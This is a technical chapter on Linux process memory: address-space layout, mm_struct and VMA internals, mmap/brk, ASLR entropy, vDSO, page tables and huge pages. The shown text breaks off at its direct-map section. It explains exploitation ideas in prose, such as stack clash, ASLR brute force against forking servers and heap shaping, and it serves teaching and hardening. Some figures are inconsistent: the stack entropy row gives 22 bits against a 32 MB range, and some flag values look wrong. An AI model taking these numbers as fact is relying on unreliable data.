# Domain 2, Chapter 2A — Process Address Space and Memory Management

> **Scope.** Linux process address space layout on x86_64 and AArch64. The kernel data structures `task_struct`, `mm_struct`, and `vm_area_struct`. The `mmap` and `brk` system call internals and how the kernel lays out the address space. Stack placement, `RLIMIT_STACK`, and `MAP_GROWSDOWN`. Heap placement and the `sbrk`/`brk` implementation. ASLR entropy on Linux. The vDSO and vvar pages. The vsyscall page on older kernels. Memory mapping flags. The `mprotect`, `mremap`, `mincore`, `madvise`, and `msync` system calls and their security implications. Page fault handling and `vm_fault_t`. The kernel's page table management: PGD, PUD, PMD, PTE traversal on x86_64. Huge pages (2 MB and 1 GB) and their security implications. Transparent Huge Pages and `khugepaged`. ASLR bypass techniques: information leaks, format string exploitation, `/proc/self/maps`, brute-force in fork-no-exec servers, partial overwrites, and side channels. Stack Clash exploitation (CVE-2017-1000364). Dirty COW (CVE-2016-5195) race condition mechanism and detection. Heap shaping via `mmap`/`munmap` and `MADV_DONTNEED`. `MAP_FIXED` abuse for library replacement. Page table manipulation attacks: ret2dir and PTE overwrite. Memory layout forensics, ASLR verification, auditd/Sigma/eBPF detection rules, and sysctl hardening configuration.
>
> **Prerequisites.** Domain 1 (binary formats). The ELF loading sequence described in Chapter 1A §5 and §12 is the entry point into this chapter — that chapter described the `mmap` calls the kernel makes during `load_elf_binary`; this chapter explains the kernel-side machinery those calls invoke.

---

## 1. The canonical address space layout

### 1.1 x86_64

The x86_64 architecture enforces a canonical address split: the 64-bit virtual address space is not flat but divided into a lower half (user) and upper half (kernel) by the hardware requirement that bits 47–63 (on 4-level paging) or bits 56–63 (on 5-level paging with LA57) are sign-extended copies of the highest implemented bit.

On a standard 4-level paging kernel, user space spans `0x0000_0000_0000_0000` to `0x0000_7FFF_FFFF_FFFF` (128 TiB). The non-canonical hole from `0x0000_8000_0000_0000` to `0xFFFF_7FFF_FFFF_FFFF` is architecturally unreachable — any dereference generates a `#GP` fault regardless of page tables. Kernel space occupies `0xFFFF_8000_0000_0000` to `0xFFFF_FFFF_FFFF_FFFF` (128 TiB). This separation is a useful property: kernel pointers and user pointers can never overlap, and the hole catches truncated or partially-corrupted pointers.

With 5-level paging (`CONFIG_X86_5LEVEL` / LA57), user space extends to 128 PiB (`0x00FF_FFFF_FFFF_FFFF`), and the kernel's region shifts correspondingly. LA57 is opt-in; most current kernels still default to 4-level.

Within user space, a typical process layout from lowest to highest address:

The NULL page sits unmapped at address zero to catch NULL dereferences. Above it, the PIE text and data segments land at an ASLR-randomized base (typically in the `0x5XXX_XXXX_XXXX` range), containing `.text` (RX), `.rodata` (R), `.data`/`.bss` (RW), and `.got`/`.got.plt` (RW or R after RELRO). The `brk` heap starts just above the BSS. The mmap region occupies the middle portion, growing downward from a randomized `mmap_base` below the stack, and holds shared libraries, anonymous mappings from `malloc`, and file-backed mappings. Near the top of user space sits the main thread stack (growing downward, default 8 MB), with `argv`, `envp`, and `auxv` at the very top, and the vDSO/vvar pages mapped nearby.

Thread stacks are not placed in the main stack region. They are allocated via `mmap(MAP_ANONYMOUS | MAP_PRIVATE)` and scatter through the mmap region. Each thread stack typically has a guard page (an unmapped page below the stack) to catch overflow.

### 1.2 AArch64

AArch64 uses a split virtual address space controlled by two page table base registers: `TTBR0_EL1` for user space (addresses with high bits clear) and `TTBR1_EL1` for kernel space (addresses with high bits set). The split point depends on `TCR_EL1.T0SZ` and `T1SZ`.

A typical 48-bit VA configuration gives user space `0x0000_0000_0000_0000` to `0x0000_FFFF_FFFF_FFFF` (256 TiB — twice x86_64's user half) and kernel space at the high end. With 52-bit VA (`LVA` feature), both halves extend to 4 PiB.

The layout within user space is broadly similar to x86_64, with one notable difference: AArch64 supports Top Byte Ignore (TBI), which tells the hardware to ignore the top byte of a user pointer for address translation. This byte is then available for software purposes — pointer tagging. Linux enables TBI for user space by default (`CONFIG_ARM64_TBI`), which means bits 56–63 of user pointers are metadata, not address. This is exploited by Memory Tagging Extension (MTE), which uses bits 59–56 as a memory-safety tag that must match the tag on the accessed granule; by HWASAN for lightweight address sanitization; and by Pointer Authentication (PAC), which stores a cryptographic MAC in the non-address bits.

A defender writing memory-scanning tools for AArch64 must mask the top byte before treating a value as an address.

---

## 2. Kernel data structures: `task_struct`, `mm_struct`, `vm_area_struct`

### 2.1 `task_struct`

Every thread in the kernel is represented by a `task_struct` (defined in `include/linux/sched.h`). It is the central process descriptor — roughly 8–10 KB depending on kernel config. Security-relevant fields include:

`pid` and `tgid`: thread ID and thread-group ID. `tgid` is the POSIX "process ID" returned by `getpid()`; `pid` is what `gettid()` returns. Threads in the same process share `tgid`.

`real_cred` and `cred`: pointers to `struct cred`, the credential structure holding UIDs/GIDs, capabilities, security context, and keyrings. `real_cred` is the objective credential (what others see when checking access); `cred` is the subjective credential (what this task uses when making its own access checks). They are usually the same pointer but diverge during `execve` of a setuid binary or during `commit_creds`.

`mm`: pointer to the process's `mm_struct` (address space descriptor). Kernel threads have `mm == NULL`. If two `task_struct`s share the same `mm`, they are threads in the same address space.

`fs`: `struct fs_struct` — root directory and current working directory.

`files`: `struct files_struct` — the file descriptor table.

`nsproxy`: `struct nsproxy` — the set of namespaces (mount, PID, network, UTS, IPC, cgroup, time) this task belongs to.

`seccomp`: `struct seccomp` — seccomp filter state, including the `mode` (`SECCOMP_MODE_DISABLED`, `SECCOMP_MODE_STRICT`, `SECCOMP_MODE_FILTER`) and the `filter` chain.

`security`: LSM-specific blob (a void pointer to whatever SELinux, AppArmor, etc. hang on this task).

`signal`: `struct signal_struct` — shared across threads, contains `rlim` (resource limits) and other per-process state.

`comm`: 16-byte executable name (truncated). What appears in `ps` and `/proc/PID/comm`. Easily changed by the process via `prctl(PR_SET_NAME)`.

### 2.2 `mm_struct`

The address space descriptor (`include/linux/mm_types.h`). One per process (shared across all threads in that process). Key fields:

`mm_mt`: the maple tree (replacement for the red-black tree `mm_rb` in kernels 6.1+), an ordered data structure mapping virtual address ranges to `vm_area_struct` nodes.

`pgd`: pointer to the top-level page table (PGD). This is the value loaded into `CR3` (x86_64) or `TTBR0_EL1` (AArch64) on context switch.

`mmap_base`: the base of the mmap region (randomized by ASLR).

`start_code`, `end_code`, `start_data`, `end_data`: boundaries of the executable's text and data segments.

`start_brk` and `brk`: the start and current end of the `brk` heap.

`start_stack`: bottom (lowest address) of the main thread's stack.

`arg_start`, `arg_end`, `env_start`, `env_end`: positions of `argv` and `envp` on the stack.

`total_vm`, `locked_vm`, `pinned_vm`, `data_vm`, `exec_vm`, `stack_vm`: accounting counters used for resource-limit enforcement.

`map_count`: number of VMAs, compared against `/proc/sys/vm/max_map_count` (default 65530). Exceeding this limit causes `mmap` to fail — a DoS vector if an attacker can create VMAs by repeatedly `mmap`ing small regions.

`context`: architecture-specific MMU context. On x86_64, this includes the `ldt` (Local Descriptor Table) and the PCID (Process Context IDentifier) used by TLB tagging.

### 2.3 `vm_area_struct` (VMA)

Each contiguous range of virtual memory with uniform permissions is represented by a `vm_area_struct`:

```c
struct vm_area_struct {
    unsigned long vm_start;      /* inclusive start address */
    unsigned long vm_end;        /* exclusive end address */
    pgoff_t vm_pgoff;            /* offset into file (for file-backed) */
    struct file *vm_file;        /* file backing (NULL for anonymous) */
    vm_flags_t vm_flags;         /* VM_READ, VM_WRITE, VM_EXEC, VM_SHARED, ... */
    const struct vm_operations_struct *vm_ops;  /* fault handler, etc. */
    /* ... maple tree linkage, anon_vma, etc. */
};
```

`vm_flags` is the source of truth for VMA permissions, distinct from the PTE-level permissions (which are the hardware-enforced subset). Key flags:

`VM_READ` (0x1), `VM_WRITE` (0x2), `VM_EXEC` (0x4) are access permissions. `VM_SHARED` (0x8) means updates are visible to other mappers of the same file; without it, the mapping is private (copy-on-write). `VM_GROWSDOWN` (0x100) is the stack-growth flag enabling auto-expansion downward on page fault. `VM_DONTCOPY` (0x200) prevents copying this VMA on `fork`. `VM_DONTEXPAND` (0x40000) prevents expansion by `mremap`. `VM_LOCKED` (0x2000) means pages are locked in RAM, requiring `CAP_IPC_LOCK` or sufficient `RLIMIT_MEMLOCK`. `VM_IO` (0x4000) marks I/O memory mappings. `VM_PFNMAP` (0x10) marks pages not managed by the page allocator. `VM_HUGETLB` marks huge-page mappings. `VM_DONTDUMP` (0x4000000) excludes the VMA from core dumps. `VM_WIPEONFORK` (0x2000000) zeroes the VMA's contents in the child after `fork`, used by some allocators to protect secret data from leaking across fork boundaries.

The VMA list is what `cat /proc/PID/maps` reads. Each line corresponds to one VMA: address range, permissions (`rwxp` or `rwxs`), offset, device, inode, and pathname. This is the primary runtime visibility tool for memory layout analysis.

---

## 3. `mmap` and `brk` internals

### 3.1 `mmap`

`mmap` is the universal allocator for virtual address space. The kernel entry point is `ksys_mmap_pgoff` → `do_mmap` → `mmap_region`. The flow:

**Address selection.** If `MAP_FIXED` is set, the requested address is used exactly (existing overlapping VMAs are silently unmapped — a dangerous semantic). Otherwise, the kernel searches the VMA tree for a sufficiently large gap. The search direction depends on the process's mmap layout: legacy (bottom-up, starting above the brk heap) or modern (top-down, starting below the stack at `mmap_base`). Modern is the default on x86_64.

**Permission checks.** The kernel validates the requested `prot` against the process's `personality`, SELinux policies, and `mmap_min_addr`. The `mmap_min_addr` sysctl (default 65536 on most distributions) prevents mappings at very low addresses, closing the classic NULL-dereference-to-kernel-pointer-dereference escalation path.

**VMA creation.** A new `vm_area_struct` is allocated and inserted into the maple tree. If the new VMA is adjacent to an existing one with identical permissions and backing, the kernel may merge them into a single VMA (VMA merging).

**No pages are allocated yet** (unless `MAP_POPULATE` is set). The VMA exists in the address space as "claimed virtual address range," but the PTEs are absent. Actual physical pages are allocated on first access via the page fault handler (§9).

For file-backed mappings (`vm_file != NULL`), the kernel uses the file's `address_space` and its `readpage`/`readahead` operations to bring pages in on fault. For anonymous mappings (`MAP_ANONYMOUS`), pages come from the page allocator and are zero-filled.

`MAP_PRIVATE` creates a copy-on-write mapping: reads come from the backing store (file or zero page), and the first write triggers a page fault that allocates a private copy. `MAP_SHARED` creates a mapping where writes are immediately visible to other mappers and are eventually flushed to the backing file.

### 3.2 `brk`

`brk` is the older, simpler memory allocator: it moves the "program break" — the end of the data segment. `sys_brk` sets the break to the requested address (if it is beyond `start_brk` and within resource limits and doesn't collide with existing VMAs). The kernel either extends the existing brk VMA or shrinks it. glibc's `malloc` uses `brk` for small allocations (up to `M_MMAP_THRESHOLD`, default 128 KB) and `mmap` for large ones.

`start_brk` is placed just after the last `PT_LOAD` segment's BSS (rounded up to a page boundary). With ASLR, a random offset is added. The `brk` region grows upward.

Security note: the `brk` heap and the binary's data segment are adjacent in the address space. A linear heap overflow from the `brk` heap can reach the binary's GOT, `.data`, or other writable sections if they are immediately below `start_brk`. Full RELRO protects the GOT from this, but other writable data (function pointers in `.data`, vtable pointers in C++ globals) remains exposed. The mitigation is large allocations going through `mmap` (which lands them elsewhere in the address space) and ASLR randomizing `start_brk` relative to the binary.

---

## 4. Stack placement

The main thread stack is placed by the kernel at the top of the user address space (just below `TASK_SIZE`), randomized by ASLR (a random offset of up to `STACK_RND_MASK` pages, which is 8192 pages = 32 MB on x86_64). Its size is limited by `RLIMIT_STACK` (default 8 MB on most distributions).

The stack grows downward. On first access to a page below the current stack bottom but above the stack VMA's lower bound, the kernel's stack-growth fault handler (`expand_stack`) extends the VMA. The VMA is created with `VM_GROWSDOWN`, which enables this auto-expansion on page fault.

`MAP_GROWSDOWN` can also be requested explicitly via `mmap`, though it is rarely useful outside of stack allocation. The auto-expansion logic checks that the fault address is below `vm_start` but within the expansion guard distance, that the expansion would not exceed `RLIMIT_STACK`, and that the expansion would not collide with another VMA. If all checks pass, `vm_start` is moved down and the missing PTE is populated.

**Stack clash.** The stack grows by at most one page at a time through normal expansion. A function that allocates a very large local variable (e.g., a 1 MB array on the stack) can skip over the guard page and land in an adjacent VMA (the mmap region or the heap), writing into it without triggering a fault. This is the "stack clash" vulnerability class. The kernel mitigation is the **stack gap** (`stack_guard_gap`, default 256 pages = 1 MB): a gap between the stack VMA and any adjacent VMA that the stack cannot grow past. The compiler mitigation is **stack probing** (`-fstack-clash-protection`): the compiler emits a page-granular probe (a write to each page) during large stack allocations, ensuring every guard page in the path is touched.

Thread stacks are created by `pthread_create` via `mmap(MAP_ANONYMOUS | MAP_PRIVATE)` with a guard page (`mprotect(PROT_NONE)` on the bottom page). Thread stacks have a fixed size (default `PTHREAD_STACK_MIN` to `RLIMIT_STACK`; configurable via `pthread_attr_setstacksize`). They do not use `MAP_GROWSDOWN` — they are fixed-size mappings. A thread stack overflow hits the guard page and generates `SIGSEGV`.

---

## 5. ASLR entropy

ASLR randomizes the placement of the executable, the mmap region, the stack, the brk heap, and the vDSO. The entropy for each region on x86_64 (4-level paging, `CONFIG_ARCH_MMAP_RND_BITS_MAX = 32`):

| Region            | Bits of entropy (typical) | Randomization range             |
|-------------------|---------------------------|---------------------------------|
| Stack             | 22 bits                   | 8192 pages × 4 KB = 32 MB      |
| mmap base         | 28–32 bits                | configurable via sysctl         |
| PIE executable    | 28 bits                   | from `ELF_ET_DYN_BASE` + offset |
| brk (heap)        | 13 bits                   | 8192 bytes                      |
| vDSO              | varies (piggybacks mmap)  | near stack                      |

The actual number of randomization bits is controlled by `/proc/sys/vm/mmap_rnd_bits` (default 28 on x86_64, maximum 32) and `/proc/sys/vm/mmap_rnd_compat_bits` (for 32-bit compatibility processes).

On AArch64, the defaults are higher: `mmap_rnd_bits` default 18 for 39-bit VA, 24 for 48-bit VA, configurable up to 33 for 48-bit VA. The larger address space provides more room.

ASLR on Linux is per-`execve` — every new process execution randomizes all positions independently. `fork` preserves the parent's layout exactly.

Hardening considerations: ASLR with 28 bits of mmap entropy means an attacker who can repeatedly attempt (e.g., against a forking server that `fork`s but does not `execve`) needs at most roughly 256 million attempts to guess a library address, which is infeasible in most contexts but feasible against services with very fast fork-and-die cycles. Increasing `mmap_rnd_bits` to 32 helps. Processes that fork without exec (Apache prefork, some PHP configurations) share the parent's ASLR layout across all children — a single information leak in any child reveals the layout for all of them. This is a fundamental architectural weakness of fork-based service models.

---

## 6. The vDSO and vvar pages

### 6.1 vDSO

The vDSO (virtual Dynamic Shared Object) is a small ELF shared object synthesized by the kernel and mapped into every user process. It provides userspace implementations of a few system calls that can be answered without a kernel transition.

On x86_64 it exports `clock_gettime`, `gettimeofday`, `time`, `clock_getres`, and `getcpu`. On AArch64 it exports `clock_gettime`, `gettimeofday`, `clock_getres`, and `rt_sigreturn`.

The vDSO reads from the **vvar pages** — a kernel-maintained read-only mapping containing the current time state (`struct vdso_data`), updated by the kernel's timer interrupt handler. Because the data is mapped read-only into user space and updated atomically by the kernel, the vDSO functions can compute the current time without any system call — just a sequence of reads from vvar with a seqcount retry loop to handle concurrent updates.

The vDSO is a proper ELF: it has a `PT_LOAD`, a `.dynsym`, and exported symbols that glibc's dynamic linker resolves. `AT_SYSINFO_EHDR` in the auxiliary vector points the dynamic linker at it. It appears in `/proc/PID/maps` as `[vdso]`.

### 6.2 vvar

The vvar pages appear as `[vvar]` in `/proc/PID/maps`. They are read-only from user space and contain the `vdso_data` structures. Because they are kernel-maintained, they cannot be corrupted by the process — but they can be read, and their content (precise timing data) can be used for side-channel attacks (timing-based covert channels, cache-timing attacks using `clock_gettime` as a high-resolution timer).

### 6.3 vsyscall (legacy, x86_64 only)

The vsyscall page is the predecessor of the vDSO. It was mapped at the fixed virtual address `0xFFFF_FFFF_FF60_0000` and contained three callable entry points at fixed offsets: `gettimeofday` at +0x000, `time` at +0x400, `getcpu` at +0x800.

The fixed address made it a reliable source of ROP gadgets — attackers could use vsyscall entry points as known-address code snippets regardless of ASLR. Modern kernels provide three configurations:

`CONFIG_X86_VSYSCALL_EMULATE` (default): the vsyscall page is mapped but with `_PAGE_USER` cleared — any user access generates a page fault, and the kernel's fault handler emulates the three known call addresses by examining the faulting RIP and synthesizing the appropriate syscall result. This preserves compatibility (old binaries that `call` into the vsyscall page still work) while preventing use of the page as a gadget source (the page is not actually executable from user mode).

`CONFIG_X86_VSYSCALL_XONLY`: the page is mapped execute-only, preventing reads of the page contents (no gadget scanning) while allowing calls.

`CONFIG_X86_VSYSCALL_NONE`: the page is not mapped at all. Old binaries crash.

Kernel command line: `vsyscall=emulate`, `vsyscall=xonly`, `vsyscall=none`.

Hardened systems should use `vsyscall=none` if their userland is new enough (anything built against glibc 2.14+ uses the vDSO instead).

---

## 7. Memory mapping flags

The `mmap` flags parameter is a bitmask controlling the mapping's semantics.

### 7.1 Visibility and sharing

`MAP_PRIVATE` (0x02): copy-on-write. Changes are private to this process. The backing pages are shared (read-only) with other mappers until the first write, at which point a private copy is made. This is the normal mode for loading executable code and data: the `.text` pages of `libc.so` are physically shared across all processes via `MAP_PRIVATE` file-backed mappings.

`MAP_SHARED` (0x01): changes are immediately visible to all mappers and (for file-backed mappings) are written back to the file. Used for IPC (shared memory), memory-mapped database files, and `mmap`-based I/O. `MAP_SHARED` anonymous mappings (with `MAP_ANONYMOUS`) are used for IPC between related processes across `fork`.

`MAP_SHARED_VALIDATE` (0x03): like `MAP_SHARED` but the kernel validates all flags and rejects unknown ones. Required when using `MAP_SYNC`.

### 7.2 Backing

`MAP_ANONYMOUS` (0x20): no file backing; pages are zero-filled on first access. The `fd` parameter is ignored. Used for heap allocations, thread stacks, and any demand-zero memory.

File-backed (no `MAP_ANONYMOUS`): `fd` is an open file descriptor; `offset` is the file offset. Pages are filled by reading from the file.

### 7.3 Address control

`MAP_FIXED` (0x10): place the mapping at exactly the specified address. If existing mappings overlap, they are silently unmapped and replaced. Dangerous: a misused `MAP_FIXED` can destroy the stack, the heap, or a loaded library. The kernel provides `MAP_FIXED_NOREPLACE` (Linux 4.17+) which fails with `EEXIST` instead of silently replacing.

### 7.4 Performance and residency

`MAP_POPULATE` (0x08000): pre-fault all pages at `mmap` time. Avoids later page faults at the cost of up-front latency.

`MAP_LOCKED` (0x02000): pages are faulted in and locked in RAM (not eligible for swap-out). Requires `CAP_IPC_LOCK` or sufficient `RLIMIT_MEMLOCK`.

`MAP_HUGETLB` (0x40000): allocate using huge pages (2 MB or 1 GB on x86_64, depending on `MAP_HUGE_2MB`/`MAP_HUGE_1GB` flags). Requires huge-page pool reservation.

`MAP_SYNC` (0x80000): for DAX (direct-access) mappings on persistent memory. Guarantees that `msync`/`fsync` durability semantics are respected at page granularity. Used with `MAP_SHARED_VALIDATE`.

### 7.5 Other flags

`MAP_GROWSDOWN` (0x00100): the mapping can grow downward on page fault. Used internally for the main stack.

`MAP_NORESERVE` (0x04000): don't reserve swap space for this mapping. Allows overcommit — the kernel may allow the mapping even if there isn't enough swap + RAM to back it, relying on the OOM killer if memory actually runs out.

`MAP_STACK` (0x20000): hint that this mapping is a thread stack. Currently a no-op on x86_64 but reserved for future use.

---

## 8. `mprotect`, `mremap`, and other memory management syscalls

### 8.1 `mprotect`

Changes the page permissions of an existing mapping. The kernel's `do_mprotect_pkey` iterates over the affected VMAs, splits VMAs at the boundaries of the requested range if necessary, updates `vm_flags`, and walks the page tables to update PTE permission bits.

The `prot` argument is a combination of `PROT_READ`, `PROT_WRITE`, `PROT_EXEC`, and `PROT_NONE`.

Security constraints: SELinux's `execmem` permission controls `PROT_EXEC` on anonymous or private mappings — without `execmem`, a process cannot make anonymous memory executable, blocking both JIT compilation and shellcode injection. Making a mapping both writable and executable (`PROT_WRITE | PROT_EXEC`) is a syscall that seccomp policies and audit rules can catch. The kernel refuses to add `PROT_EXEC` to a `MAP_SHARED` file-backed mapping of a file on a `noexec`-mounted filesystem.

Protection keys (`pkey_mprotect`): on x86_64 CPUs with PKU (Protection Keys for User pages), `pkey_mprotect` associates a 4-bit key with the VMA; the user-mode `PKRU` register then controls per-key access rights without any system call. This enables fast, fine-grained, thread-local permission changes — a process can `WRPKRU` to disable writes to a memory region, then re-enable them only for the duration of a specific operation. Used by some hardened allocators and CFI implementations.

### 8.2 `mremap`

Moves or resizes an existing mapping. `mremap(old_addr, old_size, new_size, flags, [new_addr])` can expand a mapping (if there is adjacent free space or if `MREMAP_MAYMOVE` allows relocation), shrink it, or move it to a new address (`MREMAP_FIXED`). The kernel updates the VMA and page tables accordingly, potentially remapping existing PTEs to new virtual addresses.

`mremap` is the mechanism `realloc` uses (via glibc) when a `mmap`'d allocation needs to grow. It is significantly cheaper than `mmap` + `memcpy` + `munmap` because it remaps existing pages rather than allocating new ones.

Security note: `MREMAP_FIXED` has the same destructive semantics as `MAP_FIXED` — it silently unmaps anything at the destination.

### 8.3 `mincore`

`mincore(addr, length, vec)` queries which pages of a mapping are currently resident in physical memory (in the page cache). The output is a byte vector with one entry per page; bit 0 indicates residency.

Security implication: `mincore` historically leaked information about the page cache state, which is process-global (a page cached by one process's file mapping is visible as resident to any other process mapping the same file). This enabled page-cache side-channel attacks: an attacker could use `mincore` to infer whether a victim had accessed specific file pages. Since Linux 5.0, `mincore` on file-backed mappings reports residency only for pages the calling process itself has accessed (not for pages brought in by other processes), partially closing this channel.

### 8.4 `madvise`

`madvise(addr, length, advice)` gives the kernel hints about the process's intended access pattern. Security-relevant advice values:

`MADV_DONTNEED`: the kernel may immediately free the pages in the range. For private anonymous mappings, this zeros them; for file-backed mappings, this drops them from the page cache. Used by allocators to release memory without `munmap`'ing the VMA. Also used by exploitation primitives: `MADV_DONTNEED` on a region followed by re-faulting can get fresh zero pages for heap shaping.

`MADV_FREE` (Linux 4.5+): marks pages as lazy-freeable — kept until memory pressure evicts them, at which point they are discarded rather than swapped. Cheaper than `MADV_DONTNEED` for allocator free-list maintenance.

`MADV_DONTFORK`: exclude this VMA from the child's address space on `fork`. The child gets an unmapped hole. Used to prevent leaking sensitive data (crypto keys) across fork.

`MADV_WIPEONFORK`: like `MADV_DONTFORK`, but the child gets a zero-filled mapping rather than a hole. Used by memory allocators to protect allocation metadata from fork leaks.

`MADV_DONTDUMP`: exclude from core dumps. Used for sensitive data regions.

`MADV_MERGEABLE` / `MADV_UNMERGEABLE`: enables or disables KSM (Kernel Same-page Merging) for this range. See Chapter 2C.

`MADV_HUGEPAGE` / `MADV_NOHUGEPAGE`: enables or disables Transparent Huge Pages for this range.

### 8.5 `msync`

`msync(addr, length, flags)` flushes changes to a `MAP_SHARED` file-backed mapping back to the file. `MS_SYNC` is synchronous; `MS_ASYNC` starts the writeback but returns immediately; `MS_INVALIDATE` invalidates other mappings of the same file.

---

## 9. Page fault handling

When a process accesses a virtual address that has no valid PTE (or has a PTE with insufficient permissions), the CPU raises a page fault. On x86_64, this is a `#PF` (interrupt 14); `CR2` holds the faulting address. The kernel handler is `do_page_fault` → `handle_mm_fault` → `__handle_mm_fault`.

The fault handler's decision tree:

**Is the faulting address in a VMA?** Walk the maple tree to find a VMA containing the address. If no VMA is found, check for stack expansion (`VM_GROWSDOWN` / `expand_stack`). If still no VMA: this is an invalid access → `SIGSEGV`.

**Are the permissions sufficient?** Compare the fault type (read/write/exec, from the error code) against the VMA's `vm_flags`. A write to a `VM_READ`-only VMA, or an exec on a non-`VM_EXEC` VMA, is a permission violation → `SIGSEGV`.

**What kind of fault is it?** Three main cases:

Demand paging: the PTE is absent (not present). This is the normal first-access case. The handler allocates a physical page, reads in the data (from the file for file-backed, zeroes for anonymous), installs the PTE, and returns.

Copy-on-write: the PTE is present but read-only, the VMA is `VM_WRITE`, and this is a write fault. The handler allocates a new page, copies the contents, installs the new PTE with write permission, and decrements the old page's reference count. If the old page's refcount drops to 1, the kernel may upgrade the remaining PTE to writable without copying.

Swap in: the PTE contains a swap entry (not a page frame number). The handler reads the page from swap, allocates a physical page, populates it, and installs the PTE.

The return type `vm_fault_t` is a bitmask: `VM_FAULT_OOM` (out of memory), `VM_FAULT_SIGBUS` (e.g., accessing beyond the file's size), `VM_FAULT_SIGSEGV`, `VM_FAULT_MAJOR` (the fault required I/O), `VM_FAULT_MINOR` (no I/O needed), `VM_FAULT_RETRY` (the handler dropped mmap locks and the caller should retry).

**The `userfaultfd` interception point**: if a VMA is registered with `userfaultfd`, the fault handler does not resolve the fault itself. Instead, it blocks the faulting thread and notifies the `userfaultfd` file descriptor's reader (typically a monitor process), which can then supply the page contents via `UFFDIO_COPY` or `UFFDIO_ZEROPAGE`. This mechanism is covered in Chapter 2B for its exploitation relevance.

---

## 10. Page table management on x86_64

### 10.1 The four-level hierarchy

x86_64 with standard 4-level paging uses a four-level radix tree. `CR3` holds the physical address of the PGD (Page Global Directory). Each level has 512 entries (indexed by 9 bits of the virtual address), each entry 8 bytes, totaling 4 KB per table page:

| Level | VA bits | Maps         | Structure |
|------:|---------|--------------|-----------|
| PGD   | 47–39   | 512 GiB each | `pgd_t`   |
| PUD   | 38–30   | 1 GiB each   | `pud_t`   |
| PMD   | 29–21   | 2 MiB each   | `pmd_t`   |
| PTE   | 20–12   | 4 KiB each   | `pte_t`   |

Bits 11–0 are the page offset within the 4 KB page.

With 5-level paging, a P4D level is inserted between the PGD and PUD, mapping bits 56–48 and extending the addressable range to 128 PiB.

### 10.2 Page table entry format (x86_64)

Each PTE (and PMD/PUD when not a huge page) is a 64-bit word. Key bit fields:

Bit 0 (`_PAGE_PRESENT`): the page is in physical memory. If clear, the rest of the entry is software-defined (used for swap entries, migration entries) and any access faults.

Bit 1 (`_PAGE_RW`): writable. If clear, the page is read-only.

Bit 2 (`_PAGE_USER`): user-mode accessible. If clear, only kernel mode can access. This is the fundamental user/kernel separation at the hardware level.

Bit 3 (`_PAGE_PWT`): Page-Level Write-Through. Controls caching policy.

Bit 4 (`_PAGE_PCD`): Page-Level Cache Disable.

Bit 5 (`_PAGE_ACCESSED`): set by the hardware on any access. Used by the kernel's page reclaim algorithm to identify "hot" pages.

Bit 6 (`_PAGE_DIRTY`): set by the hardware on a write. Used by the kernel to know which pages need to be written back before eviction.

Bit 7 (`_PAGE_PSE`, in PMD/PUD only): Page Size Extension. If set, this entry maps a huge page (2 MB at PMD level, 1 GB at PUD level) rather than pointing to the next level of page tables.

Bits 12–51: the page frame number (physical address of the target page or next-level page table).

Bit 63 (`_PAGE_NX` / `XD` — eXecute Disable): if set, instruction fetches from this page generate a `#PF`. This is the hardware basis for DEP/NX/W^X. On modern Linux, all data pages have `_PAGE_NX` set; only `.text` segments and the vDSO have it clear.

Software-used bits (bits 9–11 and several others depending on config): the kernel uses these for bookkeeping including KASAN shadow-page tagging and various debug features.

### 10.3 KPTI (Kernel Page Table Isolation)

KPTI (originally KAISER) is the kernel's mitigation for the Meltdown vulnerability (CVE-2017-5754). On vulnerable Intel CPUs, speculative execution could read kernel memory from user mode, leaking kernel data despite `_PAGE_USER` being clear.

KPTI maintains two sets of page tables per process: the **kernel page tables** (containing both user and kernel mappings) and the **user page tables** (containing only user mappings plus a minimal kernel trampoline needed for the syscall entry path). On entry to user mode, `CR3` is switched to the user page tables; on entry to the kernel, `CR3` is switched back to the kernel page tables.

The `CR3` switch uses **PCID** (Process Context Identifiers) to avoid flushing the TLB on every transition. The user-mode and kernel-mode page tables are assigned different PCIDs; the TLB can hold entries for both simultaneously and distinguish them by PCID tag.

KPTI has a measurable performance cost (estimated 5–30% on syscall-heavy workloads). On CPUs not vulnerable to Meltdown (AMD, and Intel from Ice Lake onward with hardware fixes), KPTI can be disabled (`nopti` kernel parameter or `CONFIG_PAGE_TABLE_ISOLATION=n`).

---

## 11. Huge pages

### 11.1 Static huge pages (hugetlbfs)

The administrator reserves a pool of huge pages at boot or runtime (`echo 1024 > /proc/sys/vm/nr_hugepages` for 1024 × 2 MB pages). Applications allocate from this pool via `mmap(MAP_HUGETLB)` or by mapping files on a `hugetlbfs` mount.

Huge pages use a PMD entry with `_PAGE_PSE` set (for 2 MB) or a PUD entry with `_PAGE_PSE` (for 1 GB), bypassing the next level(s) of page tables. Benefits include fewer TLB entries needed (one entry covers 2 MB or 1 GB instead of 4 KB) and fewer page-table levels to walk on TLB miss.

Security implications: huge pages are not swappable (they cannot be paged out) and are effectively pinned, creating a resource-DoS vector in multi-tenant environments. The larger page granularity reduces ASLR granularity: instead of 4 KB page-aligned randomization, addresses are 2 MB-aligned or 1 GB-aligned, reducing entropy.

### 11.2 Transparent Huge Pages (THP)

THP (`CONFIG_TRANSPARENT_HUGEPAGE`) is the kernel's automatic huge-page promotion mechanism. The kernel's `khugepaged` thread scans for aligned runs of 512 contiguous 4 KB pages (= 2 MB) with identical permissions and backing, collapses them into a single 2 MB huge page, and updates the PMD entry. This happens transparently.

THP can be enabled system-wide (`/sys/kernel/mm/transparent_hugepage/enabled`: `always`, `madvise`, or `never`) or per-VMA (`MADV_HUGEPAGE`/`MADV_NOHUGEPAGE`). The default on most distributions is `madvise`.

`khugepaged` runs as a kernel thread, periodically scanning process address spaces for collapse opportunities. It takes `mmap_lock` and can cause latency spikes during performance-sensitive operations.

Security implications: Dirty COW (CVE-2016-5195) exploited a race in the copy-on-write fault handler, and THP's larger page size meant that a successful exploitation corrupted 2 MB rather than 4 KB, amplifying the damage. THP collapse causes measurable latency spikes whose timing can leak information about memory access patterns. THP split (when a huge page must be broken back into 4 KB pages on a partial `mprotect`) increases VMA count and can push a process over the `max_map_count` limit.

---

## 12. The kernel's direct physical memory map

The kernel maintains a direct (linear) mapping of all physical memory at a fixed offset in kernel virtual address space. On x86_64, the direct map starts at `PAGE_OFFSET` (`0xFFFF_8880_0000_0000` on recent kernels with 4-level paging, plus KASLR randomization). Every byte of physical RAM is accessible to the kernel at `__va(physical_address) = physical_address + PAGE_OFFSET`.

The direct map is what `kmalloc`, `alloc_pages`, and the slab allocator use: they allocate physical pages and return pointers within the direct map. It is also what makes `process_vm_readv`/`process_vm_writev` and `/proc/PID/mem` work internally: the kernel reads another process's memory by walking that process's page tables, finding the physical page frame, and accessing it through its own direct map.

Security relevance:

